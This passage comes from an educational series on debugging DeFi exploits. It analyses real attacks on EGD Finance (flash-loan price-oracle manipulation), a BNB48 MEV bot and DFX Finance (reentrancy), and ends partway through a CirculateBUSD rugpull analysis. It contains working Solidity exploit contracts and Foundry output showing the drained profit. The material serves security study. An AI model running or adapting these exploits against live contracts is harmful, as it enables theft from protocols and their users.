        // Exchange the stolen EGD Token for USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //Attacker repays 2,000 USDT + 0.5% service fee
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>


### Step 4: Analyzing the exploit

We see here the attacker called `Pancakeswap.swap()` function to take advantage of the exploit, looks like there is a second flash loan call in the call stack.
![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

* Pancakeswap uses the `.pancakeCall()` interface to perform a callback on the attacker’s contract. You might be wondering how the attacker is executing different codes during each of the two callbacks.

The key is in the first flash loan, the attacker used `0x0000` in callback data.
![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

However, during the second flash loan, the attacker used `0x00` in callback data.
![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)


Through this method, an attacking contract can determine what code to execute based on the `_data` parameter. Which could be either 0x0000 or 0x00.

* Let's continue with analyzing the second callback logic during the second flash loan.

During the second callback, the attacker only called `claimAllReward()` from EGD Finance:

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

Further expanding the `claimAllReward()` call stack. You’ll find EGD Finance performed a read on `0xa361-Cake-LP` for the balance of EGD Token and USDT, then transferred a large amount of EGD Token to the attacker’s contract.

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>What is the '0xa361-Cake-LP' contract?</summary>


Using Etherscan, we can see what trading pair `0xa361-Cake-LP` corresponds to.

* Option 1(faster)： View the first two largest reserve tokens of the contract in [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

* Option 2(accurate)：[Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) Check the address of token0 and token1.

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

This indicates that `0xa361-Cake-LP` is the EGD/USDT trading pair contract。

</details>
<br>

* Let's analyze the `claimAllReward()`  function to see where the exploit lies.
  <img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

We see that the amount of Staking Reward is based on the reward`quota` factor (Meaning the amount of staking, and duration of staking) multiplied by `getEGDPrice()` the current EGD token price.

**In return this means, the EGD Staking Reward is based on the price of the EGD Token. Less reward is yielded on a high EGD Token price and vice versa.**

* Now let's check how the `getEGDPrice()` function gets the current price of EGD Token:

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

We see the all-familiar equation `x * y = k` like the one we introduced earlier in the DeFi oracle introduction section, to obtain the current price. The address of the trading `pair`  is `0xa361-Cake-LP` which matches the two STATICCALLs from the transaction view.

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

So how is the attacker taking advantage of this unsafe method of getting current prices?

The underlying mechanism is such that, from the second flash loan the attacker borrowed a large amount of USDT, therefore influencing the pool price based on the `x * y = k` formula. Before returning the loan, the `getEGDPrice()`  will be incorrect.

Reference diagram:
![CleanShot 2023-01-12 at 17 01 46@2x](https://user-images.githubusercontent.com/107821372/212027306-3a7f9a8c-4995-472c-a8c7-39e5911b531d.png)
**Conclusion:  The attacker used a flash loan to alter the liquidity of the EGD/USDT trading pair, resulting in `ClaimReward()` getting an incorrect price, allowing the attacker to obtain an obscene amount of EGD tokens.**

Finally, the attacker exchanged EGD Token using Pancakeswap for USDT, thus profiting from the attack.


---

### Step 5: Reproduce

Now that we’ve fully understood the attack, let's reproduce it:

Step D. Write the PoC code for the attack

<details><summary>Click to show the code</summary>


```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>



Step E. Write the PoC code for the second flash loan using the exploit

<details><summary>Click to show the code</summary>


```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Step F.Execute the code with `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`Pay attention to the change in balances.

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```


Note: EGD-Finance.exp.sol from DeFiHackLabs includes a preemptive step which is staking.

This write-up does not include this step, feel free to try it yourself! Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8


#### The third sharing will conclude here, if you wish to learn more, check out the links below.

---

### Learning materials

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

[https://web3sec.xrex.io/](https://web3sec.xrex.io/)

---

### Appendix

# OnChain Transaction Debugging: 4. Write your own POC - MEV Bot

Author: [Sun](https://twitter.com/1nf0s3cpt)

## Write PoC step by step - Take MEV Bot (BNB48) as an example

- Recap
  - On 20220913 A MEV Bot was exploited by an attacker and all the assets on the contract were transferred away, with a total loss of about $140K.
  - The attacker sends a private transaction through the BNB48 validator node, similar to Flashbot not putting the transaction into the public mempool to avoid being Front-running.
- Analysis
  - Attacker's [TXID](https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2)，We can see that the MEV Bot contract was unverify which was not open source，How did the attacker exploit it?
  - Using [phalcon](https://phalcon.blocksec.com/tx/bsc/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2) to check，from the part of funs flow within this transaction, MEV bot transferred 6 kinds of assets to the attacker’s wallet, How did the attacker exploit it?
    ![圖片](https://user-images.githubusercontent.com/52526645/211201079-e7c5cc3b-64f8-4146-ab0e-7dd46b535cc9.png)
  - Let’s look at the invocation process of Function call, and see that the `pancakeCall` function wss called exactly 6 times.
    - From: `0xee286554f8b315f0560a15b6f085ddad616d0601`
    - Attacker's contract: `0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1`
    - MEV Bot contract: `0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d`
      ![圖片](https://user-images.githubusercontent.com/52526645/211201456-8b6f7bca-677d-40a2-b81b-fd6af18f94fd.png)
  - Let's expand one of the `pancakeCall` to see, we can see that the callback to the attacker's contract reads the value of token0() as BSC-USD, and then transfers BSC-USD to the attacker's wallet, see this While we can know that the attacker may have the permission or use a vulnerability to move all the assets on the MEV Bot contract, the next step we need to find out how the attacker uses it?
    ![圖片](https://user-images.githubusercontent.com/52526645/211201744-9895803a-5f72-4f14-b147-b67b204bee75.png)
  - Because it was mentioned earlier that the MEV Bot contract is not open source, so here we can use [Lesson 1](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools)introduced decompiler tool [Dedaub](https://library.dedaub.com/decompile), Let's analyze and see if we can find something. First copy the bytecodes of the contract from [Bscscan](https://bscscan.com/address/0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d#code) and paste to Dedaub to decompile it, As shown in the figure below, we can see that `pancakeCall` function permission is set to public, and everyone can call it. It is normal and should not be a big problem in the callback of Flash Loan, but you can see the red framed place, execute a `0x10a` function, and then let's look down.
    ![圖片](https://user-images.githubusercontent.com/52526645/211202573-b4a4847d-a617-42c8-84d0-0f2dbd38a632.png)
  - The logic of `0x10a` function is as shown in the figure below. You can see the key point in the red framed place. First read what token is in token0 on the attacker’s contract and then bring it into the transfer function `transfer`. In the function, the first parameter receiver address `address(MEM[varg0.data])` is in `pancakeCall` `varg3 (_data)` which can be controlled, so the key vulnerability problem is here.
         

<div align=center>
<img src="https://user-images.githubusercontent.com/52526645/211204177-fbebe377-23b0-4b0c-bb3e-dcb64dba2afc.png" alt="Cover" width="80%"/>
</div>


   - Looking back at the payload of the attacker calling `pancakeCall`, the first 32 bytes of the input value in `_data` is the wallet address of the payee.

<div align=center>
<img src="https://user-images.githubusercontent.com/52526645/211453390-502db65b-cf82-4805-a463-04fc5c7e0dce.png" alt="Cover" width="80%"/>
</div>


- Writing POC
  - After analyzing the attack process above, the logic of writing the POC is to call the `pancakeCall` of the MEV bot contract and then bring in the corresponding parameters. The key is `_data` to specify the receiving wallet address, and then the contract must have token0, token1 Function to satisfy the contract logic. You can try to write it yourself.
   - Answer: [POC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BNB48MEVBot_exp.sol).

<div align=center>
<img src="https://user-images.githubusercontent.com/52526645/211204852-4fa65835-17f7-4c91-80ab-79f5b46125df.png" alt="Cover" width="80%"/>
</div>


## Extended learning

- Foundry trace

  - The function traces of the transaction can also be listed using Foundry, as follows:

  `cast run 0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2 --quick --rpc-url https://rpc.ankr.com/bsc`

<div align=center>
<img src="https://user-images.githubusercontent.com/52526645/211562868-12fde773-948c-47a9-acaf-6f744438925e.png" alt="Cover" width="80%"/>
</div>


- Foundry debug

  - You can also use Foundry to debug transaction, as follows:

  `cast run 0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2 --quick --debug  --rpc-url https://rpc.ankr.com/bsc`

<div align=center>
<img src="https://user-images.githubusercontent.com/52526645/211565713-fdf3784f-da54-42e8-ad60-591ecac38c15.png" alt="Cover" width="80%"/>
</div>


## Resources

[Flashbots: Kings of The Mempool](https://noxx.substack.com/p/flashbots-kings-of-the-mempool?utm_source=profile&utm_medium=reader2)

[MEV Markets Part 1: Proof of Work](https://mirror.xyz/0xshittrader.eth/WiV8DM3I6abNMVsXf-DqioYb2NglnfjmM-zSsw2ruG8)

[MEV Markets Part 2: Proof of Stake](https://mirror.xyz/0xshittrader.eth/c6J_PCK87K3joTWmLEtG6qVN6BFXLBZxQniReYSEjLI)

[MEV Markets Part 3: Payment for Order Flow](https://mirror.xyz/0xshittrader.eth/f2VSuoZ91vAbCv82MtWM-Gosyf_DeUXfPlDx3EYV3RM)

# OnChain Transaction Debugging: 5. Write Your Own PoC (Reentrancy)

Author: [gbaleeee](https://twitter.com/gbaleeeee)

Translation: [Spark](https://twitter.com/SparkToday00)

In this article, we will learn reentrancy by demonstrating a real-world attack and using Foundry to conduct tests and reproduce the attack.

## Prerequisite

1. Understand common attack vectors in the smart contract. [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs) is a great resource to get started.
2. Know how the basic Defi model work and how smart contracts interact with others.

## What Is Reentrancy Attack

Source from: [Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/) by Consensys.

Reentrancy Attack is a popular attack vector. It almost happens every month if we look into the [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) database. For more information, there is another great repo that maintains a collection of [reentrancy-attacks](https://github.com/pcaversaccio/reentrancy-attacks),

In short, if one function invokes an untrusted external call, there could be a risk of the reentrancy attack.

Reentrancy Attacks can be mainly identified into three types:

1. Single Function Reentrancy
2. Cross-Function Reentrancy
3. Cross-Contract Reentrancy


## Hands-on PoC - DFX Finance

- Source：[Pckshield alert 11/11/2022](https://twitter.com/peckshield/status/1590831589004816384)

  > It seems @DFXFinance's DEX pool (named Curve) is hacked (w/ loss of 3000 ETH or $~4M) due to the lack of proper reentrancy protection. Here comes an example tx: https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7. The stolen funds are being deposited into @TornadoCash

- Transaction Overview

  Based on the transaction above, we can observe limited info from etherscan. It includes information about the sender (exploiter), the exploiter's contract, events during the transaction, etc. The transaction is labeled as an "MEV Transaction" and "Flashbots," indicating that the exploiter attempted to evade the impact of front-run bots.

  ![image](https://user-images.githubusercontent.com/53768199/215320542-a7798698-3fd4-4acf-90bf-263d37379795.png)  

- Transaction Analysis
  We can use [Phalcon from Blocksec](https://phalcon.blocksec.com/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7) to do the further investigation.

- Balance Analysis
  In the *Balance Changes* section, we can see the alteration in funds with this transaction. The attack contract(receiver) collected a large amount of `USDC`, and `XIDR` tokens as profit, and the contract named `dfx-xidr-v2` lost a large amount of `USDC` and `XIDR` tokens. At the same time, the address starting with `0x27e8` also obtained some `USDC` and `XIDR` tokens. According to the investigation of this address, this is the DFX Finance: Governance Multi-Signature wallet address.

  ![image](https://user-images.githubusercontent.com/53768199/215320922-72207a7f-cfac-457d-b69e-3fddc043206b.png)  

  Based on the aforementioned observations, the victim is DFX Finance's `dfx-xidr-v2` contract and loss assets are `USDC` and `XIDR` tokens. The DFX multi-signature address also receives some tokens during the process. Based on our experience, it should relate to the fee logic.

- Asset Stream Analysis
  We can use another tool from Blocksec called [metasleuth](https://metasleuth.io/result/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7) to analyze the asset flow.

  ![image](https://user-images.githubusercontent.com/53768199/215321213-7ead5043-1410-4ab6-b247-1e710d931fe8.png)

  Based on the graph above, the exploiter borrowed a large amount of `USDC`，`XIDR` tokens from the victim contract in step [1] and [2]. In step [3] and [4], the borrowed assets were sent back to the victim contract. After that, `dfx-xidr-v2` token are minted to the exploiter in step [5] and the DFX multi-sig wallet receives the fee in both  `USDC` and `XIDR` in step [6] and [7]. In the end, `dfx-xidr-v2` tokens are burned from the exploiter's address.

  As a summary, the asset stream is:

  1. The attacker borrowed `USDC`，`XIDR` tokens from the victim contract.
  2. The attacker sent the `USDC`，`XIDR` tokens back to the victim contract.
  3. The attacker minted `dfx-xidr-v2` tokens.
  4. DFX multi-sig wallet received `USDC`，`XIDR` tokens.
  5. The attacker burned `dfx-xidr-v2` tokens.

  This information can be verified with the following trace analysis.

- Trace Analysis

  Let's observe the transaction under expand level 2.

  ![image](https://user-images.githubusercontent.com/53768199/215321768-6aa93999-9a77-4af5-b758-dd91f7dc3973.png) 

  The complete attack transaction's function execution flow can be viewed as:

  1. The attacker invoked function `0xb727281f` for the attack.
  2. The attacker called `viewDeposit` in `dfx-xidr-v2` contract via `staticcall`.
  3. The attacker triggered `flash` function in `dfx-xidr-v2` contract with `call`. It is worth noting that in this trace, the function `0xc3924ed6` in the attack contract was used as a callback.

  ![image](https://user-images.githubusercontent.com/53768199/215322039-59a46e1f-c8c5-449f-9cdd-5bebbdf28796.png) 

  4. The attacker called `withdraw` function in `dfx-xidr-v2` contract.

- Detail Analysis

  The attacker's intention of calling the viewDeposit function in the first step can be found in the comment for `viewDeposit` function. The exploiter wants to obtain the number of `USDC`，`XIDR` tokens to mint 200_000 * 1e18 `dfx-xidr-v2` token.

  ![image](https://user-images.githubusercontent.com/53768199/215324532-b441691f-dae4-4bb2-aadb-7bd93d284270.png)  

  And at the next step attack using the return value from `viewDeposit` function as a similar value for the input of `flash` function invocation(the value is not exactly the same, more details later)

  ![image](https://user-images.githubusercontent.com/53768199/215329296-97b6af11-32aa-4d0a-a7c4-019f355be04d.png)

  The attacker invokes `flash` function in the victim contract as the second step. We can get some insight from the code:

  ![image](https://user-images.githubusercontent.com/53768199/215329457-3a48399c-e2e1-43a8-ab63-a89375fbc239.png)  

  As you can see, the `flash` function is similar to the flash loan in Uniswap V2. User can borrow assets via this function. And the `flash` function has a callback function for the user. The code is:

  ```solidity
  IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);
  ```

  This invocation corresponds to the callback function in the attacker's contract in the previous trace analysis section. If we do the 4Bytes Hash verification, it is `0xc3924ed6` 

  ![image](https://user-images.githubusercontent.com/53768199/215329899-a6f2cc00-f2ac-49c8-b4df-38bb24663f37.png)  

  ![image](https://user-images.githubusercontent.com/53768199/215329919-bbeb557d-41d0-47fb-bdf8-321e5217854e.png)  

  The last step is calling `withdraw` function, and it will burn the stable token(`dfx-xidr-v2`) and withdraw paired assets(`USDC`，`XIDR`).

  ![image](https://user-images.githubusercontent.com/53768199/215330132-7b54bf35-3787-495a-992d-ac2bcabb97d9.png)  

- POC Implementation

  Based on the analysis above we can implement the PoC skeleton below:

  ```solidity
  contract EXP {
      uint256 amount;
      function testExploit() public{
        uint[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee
        dfx.withdraw(amount, block.timestamp + 60);
    }
  
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
        /*
        xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
        */
    }
  }
  ```

  It is likely to raise the question of how an attacker steals assets with `withdraw` function in a flash loan. Obviously, this is the only part the attacker can work on. Now let's dive into the callback function: 

  ![image](https://user-images.githubusercontent.com/53768199/215330695-1b1fa612-4f01-4c6a-a5be-7324f464ecb1.png)

  As you can see, the attacker called `deposit` function in the victim contract and it will receive the numeraire assets that the pool supports and mint curves token. As mentioned in the graph above, `USDC` and `XIDR` are sent to the victim via `transferFrom`.

  ![image](https://user-images.githubusercontent.com/53768199/215330576-d15642f7-5819-4e83-a8c8-1d3a48ad8c6d.png)

  At this point, it is known that the completion of the flash loan is determined by checking whether the corresponding token assets in the contract are greater than or equal to the state before the execution of the flash loan callback. And `depoit` function will make this validation complete.

  ```solidity
  require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');
  require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');
  ```

  It should be noticed that the attacker prepared some `USDC` and `XIDR` tokens for the flash loan fee mechanism before the attack. This is why the attacker's deposit is relatively higher than the borrowed amount. So the total amount for `deposit` invocation is the amount borrowed with flash loan plus the fee. The validation in the `flash` function can be passed with this.

  As a result, the attacker invoked `deposit` in the callback function, bypassed the validation in the flash loan and left the record for deposit. After all these operations, attacker withdrew tokens.

  In summary, the whole attack flow is:

  1. Prepare some `USDC` and `XIDR` tokens in advance.
  2. Using `viewDeposit()` to get the number of assets for later `deposit()`.
  3. Flash `USDC` and `XIDR` tokens based on the return value in step 2.
  4. Invoke `deposit()` function in the flash loan callback .
  5. Since we have a deposit record in the previous step, now withdraw tokens.


  The full PoC implementation：  

  ```solidity
  contract EXP {
      uint256 amount;
      function testExploit() public{
        uint[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee
        dfx.withdraw(amount, block.timestamp + 60);
    }

      function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
        (amount, ) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);
    }
  }
  ```

  More detailed codebase can be found in the DefiHackLabs repo： [DFX_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DFX_exp.sol)

- Verify Fund Flow  

  Now, we can verify the asset stream graph with token events during the transaction.

  ![image](https://user-images.githubusercontent.com/53768199/215331469-e1edd9b4-5147-4f82-9e38-64edce3cc91f.png)


  At the end of the `deposit` function, `dfx-xidr-v2` tokens were minted to the exploiter. 

  ![image](https://user-images.githubusercontent.com/53768199/215331545-9730e5b0-564d-45d8-b169-3b7c8651962f.png)

  In the `flash` function, the transfer event shows the fee collection(`USDC` and `XIDR`) for the DFX multi-sig wallet.

  ![image](https://user-images.githubusercontent.com/53768199/215331819-d80a1775-4056-4ddd-9083-6f5241d07213.png)

  The `withdraw` function burned `dfx-xidr-v2` tokens that were minted in the previous steps.

- Summary

  DFX Finance reentrancy attack is a typical cross-function reentrancy attack, where the attacker completes the reentrancy by calling the `deposit` function in the flash loan callback function. 

  It is worth mentioning that the technique of this attack corresponds exactly to the fourth question in CTF damnvulnerabledefi [Side Entrance. If the project developers had done it carefully before, perhaps this attack would not have happened 🤣. In December of the same year, the [Deforst](https://github.com/SunWeb3Sec/DeFiHackLabs#20221223---defrost---reentrancy) project was also attacked due to a similar issue.



## Learning Material

[Reentrancy Attacks on Smart Contracts Distilled](https://blog.pessimistic.io/reentrancy-attacks-on-smart-contracts-distilled-7fed3b04f4b6)  
[C.R.E.A.M. Finance Post Mortem: AMP Exploit](https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5)  
[Cross-Contract Reentrancy Attack](https://inspexco.medium.com/cross-contract-reentrancy-attack-402d27a02a15)  
[Sherlock Yield Strategy Bug Bounty Post-Mortem](https://mirror.xyz/0xE400820f3D60d77a3EC8018d44366ed0d334f93C/LOZF1YBcH1eBdxlC6HP223cAMeTpNgQ-Kc4EjQuxmGA)  
[Decoding $220K Read-only Reentrancy Exploit | QuillAudits](https://quillaudits.medium.com/decoding-220k-read-only-reentrancy-exploit-quillaudits-30871d728ad5)  

# OnChain Transaction Debugging: 6. Analysis for CirculateBUSD Project Rugpull, Loss of $2.27 Million!

Author: [Numen Cyber Technology](https://twitter.com/numencyber)

Jan-12–2023 07:22:39 AM +UTC， according to NUMEN on-chain monitoring, CirculateBUSD project has been drained by the contract creator, causing a loss of 2.27 million dollars.

The fund transfer of this project is mainly because the administrator calls CirculateBUSD.startTrading, and the main judgment parameter in startTrading is the value returned by the non-open source contract SwapHelper.TradingInfo set by the administrator, and then calls SwapHelper.swaptoToken to transfer funds.

Transaction：[https://bscscan.com/tx/0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3](https://bscscan.com/tx/0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3)

<div align=center>
<img src="https://miro.medium.com/max/1400/1*fLhvqu5spyN0EIycnFNqiw.png" alt="Cover" width="80%"/>
</div>


**Analysis:**
-------------

Firstly, it calls contract startTrading ([https://bscscan.com/address/0x9639d76092b2ae074a7e2d13ac030b4b6a0313ff](https://bscscan.com/address/0x9639d76092b2ae074a7e2d13ac030b4b6a0313ff)), and inside the function the SwapHelper contract’s TradingInfo function is called, with the following details The code is as follows.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*2LithcaYFRGcqls5IY_83g.png" alt="Cover" width="80%"/>
</div>


---

<div align=center>
<img src="https://miro.medium.com/max/1400/1*XbJHPldO3T-9frrr0SQrHA.png" alt="Cover" width="80%"/>
</div>


The above figure is the call stack of tx. Combined with the code we can see that TradingInfo inside only some static calls, the key problem is not in this function. Continuing with the analysis, we found that the call stack is corresponding to the approve operation and safeapprove. Then SwapHelper’s swaptoToken function was called, which was found to be a key function in combination with the call stack, and the transfer transaction was executed in this call. The SwapHelper contract is not open source as found by the on-chain information at the following address.

[https://bscscan.com/address/0x112f8834cd3db8d2dded90be6ba924a88f56eb4b#code](https://bscscan.com/address/0x112f8834cd3db8d2dded90be6ba924a88f56eb4b#code)

Try to reverse the analysis， we firstly locate the function signature 0x63437561.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*i7kEvPo_8gYbNs9UGlo-KA.png" alt="Cover" width="80%"/>
</div>


Afterward, we located this function after decompiling and tried to find keywords such as transfer because you see that the call stack triggers a transfer.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*n8BEIqfn0tZ6plky2MFd7w.png" alt="Cover" width="80%"/>
</div>


So locate this branch of the function, first stor\_6\_0\_19, and read that part out first.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*ZGTqmc1sIz2_onKUT6-56Q.png" alt="Cover" width="80%"/>
</div>


